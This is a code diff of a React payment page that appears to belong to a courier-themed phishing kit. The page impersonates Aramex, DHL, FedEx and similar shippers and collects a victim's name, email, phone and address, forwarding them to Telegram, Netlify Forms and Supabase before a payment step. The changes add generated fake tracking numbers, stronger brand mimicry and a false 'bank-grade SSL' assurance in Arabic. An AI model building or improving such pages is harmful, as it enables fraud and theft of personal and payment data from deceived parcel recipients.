@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Helmet } from "react-helmet-async";
 import { Card } from "@/components/ui/card";
@@ -7,13 +7,15 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
+import { generateTrackingNumber } from "@/utils/trackingNumbers";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Package, Hash } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -47,8 +49,8 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [generatedTracking, setGeneratedTracking] = useState("");
 
-  // Get query parameters from URL
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const currencyParam = urlParams.get('currency');
@@ -56,31 +58,25 @@ const PaymentRecipient = () => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || shippingCompanyBranding.aramex;
   const companyMeta = getCompanyMeta(serviceKey);
 
-  // Use dynamic company meta for OG tags
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
   const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
   const dynamicImage = companyMeta.image;
 
   const shippingInfo = linkData?.payload as any;
-
-  // Get payer type from shipping info (default to "recipient" for backward compatibility)
   const payerType = shippingInfo?.payer_type || "recipient";
 
-  // Get country from link data (must be before using currency functions)
   const countryCode = shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const phoneCode = countryData?.phoneCode || "+966";
 
-  // Use currency from URL parameter if available, otherwise from country data
   const currencyCode = currencyParam || countryData?.currency || "SAR";
 
-  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
 
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -93,7 +89,6 @@ const PaymentRecipient = () => {
   }
 
   const formattedAmount = formatCurrency(amount, currencyCode);
-
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
   
   const heroImages: Record<string, string> = {
@@ -128,13 +123,19 @@ const PaymentRecipient = () => {
   };
   
   const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
+
+  useEffect(() => {
+    if (serviceKey && !generatedTracking) {
+      const tracking = shippingInfo?.tracking_number || generateTrackingNumber(serviceKey);
+      setGeneratedTracking(tracking);
+    }
+  }, [serviceKey, shippingInfo?.tracking_number, generatedTracking]);
   
   const handleProceed = async (e: React.FormEvent) => {
     e.preventDefault();
 
     if (!linkData) return;
 
-    // Submit to Netlify Forms
     const formData = new FormData();
     formData.append('form-name', 'payment-recipient');
     formData.append('name', customerName);
@@ -155,7 +156,6 @@ const PaymentRecipient = () => {
       console.error('Form submission error:', error);
     }
 
-    // Send data to Telegram
     const productionDomain = window.location.origin;
     const telegramResult = await sendToTelegram({
       type: 'payment_recipient',
@@ -171,7 +171,6 @@ const PaymentRecipient = () => {
       timestamp: new Date().toISOString()
     });
 
-    // Save customer data to the link's payload in Supabase for cross-device compatibility
     try {
       const customerData = {
         ...linkData.payload,
@@ -191,7 +190,6 @@ const PaymentRecipient = () => {
         payload: customerData
       });
     } catch (error) {
-      // Silent error handling
     }
 
     navigate(`/pay/${id}/details`);
@@ -206,71 +204,150 @@ const PaymentRecipient = () => {
         title={dynamicTitle}
         description={dynamicDescription}
       />
-      {/* Dynamic OG Image via direct meta tag injection */}
       <Helmet>
         <meta property="og:image" content={dynamicImage} />
         <meta name="twitter:image" content={dynamicImage} />
+        <meta name="theme-color" content={companyBranding.colors.primary} />
       </Helmet>
       <div 
-        className="min-h-screen bg-background" 
+        className="min-h-screen" 
         dir="rtl"
+        style={{
+          background: `linear-gradient(to bottom, ${companyBranding.colors.surface} 0%, ${companyBranding.colors.background} 100%)`
+        }}
       >
-        {/* Hero Section */}
-        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
-          <img 
-            src={heroImage}
-            alt={serviceName}
-            className="w-full h-full object-cover"
-          />
-          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
+        <div 
+          className="relative w-full h-56 sm:h-72 overflow-hidden"
+          style={{
+            background: companyBranding.gradients.hero
+          }}
+        >
+          <div className="absolute inset-0">
+            <img 
+              src={heroImage}
+              alt={serviceName}
+              className="w-full h-full object-cover opacity-20 mix-blend-overlay"
+            />
+          </div>
+          <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-transparent to-black/50" />
           
-          {/* Logo Overlay */}
-          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
-            {branding.logo && (
-              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
-                <img 
-                  src={branding.logo} 
-                  alt={serviceName}
-                  className="h-12 sm:h-16 w-auto"
-                  onError={(e) => e.currentTarget.style.display = 'none'}
-                />
-              </div>
-            )}
+          <div className="absolute top-0 left-0 right-0 p-4 sm:p-6">
+            <div className="container mx-auto max-w-2xl flex items-center justify-between">
+              {branding.logo && (
+                <div 
+                  className="bg-white rounded-2xl p-3 sm:p-4 shadow-2xl border-2"
+                  style={{ borderColor: companyBranding.colors.primary }}
+                >
+                  <img 
+                    src={branding.logo} 
+                    alt={serviceName}
+                    className="h-14 sm:h-20 w-auto max-w-[140px] sm:max-w-[200px]"
+                    onError={(e) => {
+                      e.currentTarget.style.display = 'none';
+                      const parent = e.currentTarget.parentElement;
+                      if (parent) {
+                        parent.innerHTML = `<div class="text-2xl sm:text-4xl font-bold px-4" style="color: ${companyBranding.colors.primary}">${companyBranding.nameEn}</div>`;
+                      }
+                    }}
+                  />
+                </div>
+              )}
+              
+              <Badge 
+                className="text-white border-0 text-xs sm:text-sm px-3 sm:px-4 py-1 sm:py-2"
+                style={{
+                  background: 'rgba(255, 255, 255, 0.25)',
+                  backdropFilter: 'blur(10px)'
+                }}
+              >
+                <Shield className="w-3 h-3 sm:w-4 sm:h-4 ml-1" />
+                نظام دفع آمن
+              </Badge>
+            </div>
           </div>
           
-          {/* Title Overlay */}
-          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
-            <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
-              <p className="text-xs sm:text-sm opacity-90">خدمة شحن</p>
+          <div className="absolute bottom-0 left-0 right-0 p-4 sm:p-6">
+            <div className="container mx-auto max-w-2xl">
+              <div className="text-white text-right">
+                <h1 className="text-2xl sm:text-4xl font-bold mb-2 drop-shadow-lg">
+                  {companyBranding.nameAr}
+                </h1>
+                <p className="text-sm sm:text-lg opacity-95 drop-shadow-md">
+                  {companyBranding.description}
+                </p>
+              </div>
             </div>
           </div>
         </div>
 
-        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+        <div className="container mx-auto px-3 sm:px-4 -mt-10 sm:-mt-16 relative z-10">
           <div className="max-w-2xl mx-auto">
             
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card 
+              className="p-6 sm:p-10 shadow-2xl border-t-8 backdrop-blur-sm bg-white/95"
+              style={{ borderTopColor: companyBranding.colors.primary }}
+            >
+              {generatedTracking && (
+                <div 
+                  className="mb-6 p-4 rounded-xl text-center border-2"
+                  style={{
+                    background: `linear-gradient(135deg, ${companyBranding.colors.primary}15, ${companyBranding.colors.secondary}15)`,
+                    borderColor: companyBranding.colors.primary + '30'
+                  }}
+                >
+                  <div className="flex items-center justify-center gap-2 mb-2">
+                    <Hash className="w-4 h-4 sm:w-5 sm:h-5" style={{ color: companyBranding.colors.primary }} />
+                    <span className="text-xs sm:text-sm font-semibold" style={{ color: companyBranding.colors.primary }}>
+                      رقم التتبع
+                    </span>
+                  </div>
+                  <p className="text-lg sm:text-2xl font-mono font-bold tracking-wider" style={{ color: companyBranding.colors.primary }}>
+                    {generatedTracking}
+                  </p>
+                </div>
+              )}
+
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">
+                  <h2 className="text-xl sm:text-3xl font-bold" style={{ color: companyBranding.colors.text }}>
                     {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
-                  </h1>
+                  </h2>
                   
                   <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    className="w-16 h-16 sm:w-24 sm:h-24 rounded-2xl sm:rounded-3xl flex items-center justify-center shadow-xl"
                     style={{
-                      background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                      background: companyBranding.gradients.primary,
                     }}
                   >
-                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <Package className="w-8 h-8 sm:w-12 sm:h-12 text-white" />
                   </div>
                 </div>
 
-                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
+                <div 
+                  className="mb-6 p-4 rounded-xl flex items-center gap-3"
+                  style={{
+                    background: companyBranding.colors.surface,
+                    border: `1px solid ${companyBranding.colors.border}`
+                  }}
+                >
+                  <div 
+                    className="w-12 h-12 rounded-xl flex items-center justify-center"
+                    style={{ background: companyBranding.colors.primary }}
+                  >
+                    <CreditCard className="w-6 h-6 text-white" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="text-xs text-muted-foreground">المبلغ المطلوب</p>
+                    <p className="text-xl sm:text-2xl font-bold" style={{ color: companyBranding.colors.primary }}>
+                      {formattedAmount}
+                    </p>
+                  </div>
+                </div>
+
+                <div className="space-y-4 sm:space-y-5 mb-8">
                   <div>
-                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
+                      <User className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                       الاسم الكامل
                     </Label>
                     <Input
@@ -278,14 +355,17 @@ const PaymentRecipient = () => {
                       value={customerName}
                       onChange={(e) => setCustomerName(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
+                      style={{
+                        borderColor: companyBranding.colors.border,
+                      }}
                       placeholder="أدخل اسمك الكامل"
                     />
                   </div>
                   
                   <div>
-                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
+                      <Mail className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                       البريد الإلكتروني
                     </Label>
                     <Input
@@ -294,14 +374,18 @@ const PaymentRecipient = () => {
                       value={customerEmail}
                       onChange={(e) => setCustomerEmail(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
+                      style={{
+                        borderColor: companyBranding.colors.border,
+                      }}
                       placeholder="example@email.com"
+                      dir="ltr"
                     />
                   </div>
                   
                   <div>
-                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
+                      <Phone className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                       رقم الهاتف
                     </Label>
                     <Input
@@ -310,14 +394,18 @@ const PaymentRecipient = () => {
                       value={customerPhone}
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
+                      style={{
+                        borderColor: companyBranding.colors.border,
+                      }}
                       placeholder={`${phoneCode} ${phonePlaceholder}`}
+                      dir="ltr"
                     />
                   </div>
                   
                   <div>
-                    <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm sm:text-base font-semibold">
+                      <MapPin className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
                       العنوان السكني
                     </Label>
                     <Input
@@ -325,7 +413,10 @@ const PaymentRecipient = () => {
                       value={residentialAddress}
                       onChange={(e) => setResidentialAddress(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-12 sm:h-14 text-base sm:text-lg border-2 focus:ring-2"
+                      style={{
+                        borderColor: companyBranding.colors.border,
+                      }}
                       placeholder="أدخل عنوانك السكني الكامل"
                     />
                   </div>
@@ -334,21 +425,30 @@ const PaymentRecipient = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-base sm:text-xl py-6 sm:py-8 text-white font-bold shadow-xl hover:shadow-2xl transition-all duration-300 transform hover:scale-[1.02]"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    background: companyBranding.gradients.primary
                   }}
                 >
-                  <span className="ml-2">التالي</span>
-                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                  <span className="ml-2">المتابعة للدفع</span>
+                  <ArrowLeft className="w-5 h-5 sm:w-6 sm:h-6 mr-2" />
                 </Button>
               
-                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-                  بالمتابعة، أنت توافق على الشروط والأحكام
-                </p>
+                <div 
+                  className="mt-6 p-4 rounded-xl text-center"
+                  style={{
+                    background: `${companyBranding.colors.primary}10`,
+                  }}
+                >
+                  <div className="flex items-center justify-center gap-2 text-xs sm:text-sm">
+                    <Shield className="w-4 h-4" style={{ color: companyBranding.colors.primary }} />
+                    <span style={{ color: companyBranding.colors.textLight }}>
+                      بياناتك محمية بتشفير SSL من الدرجة البنكية
+                    </span>
+                  </div>
+                </div>
               </form>
               
-              {/* Hidden Netlify Form */}
               <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                 <input type="text" name="name" />
                 <input type="email" name="email" />
@@ -359,6 +459,19 @@ const PaymentRecipient = () => {
                 <input type="text" name="linkId" />
               </form>
             </Card>
+
+            <div className="mt-6 text-center">
+              <p className="text-xs sm:text-sm text-muted-foreground">
+                بالمتابعة، أنت توافق على 
+                <a href="#" className="underline mx-1" style={{ color: companyBranding.colors.primary }}>
+                  الشروط والأحكام
+                </a>
+                و
+                <a href="#" className="underline mx-1" style={{ color: companyBranding.colors.primary }}>
+                  سياسة الخصوصية
+                </a>
+              </p>
+            </div>
           </div>
         </div>
       </div>
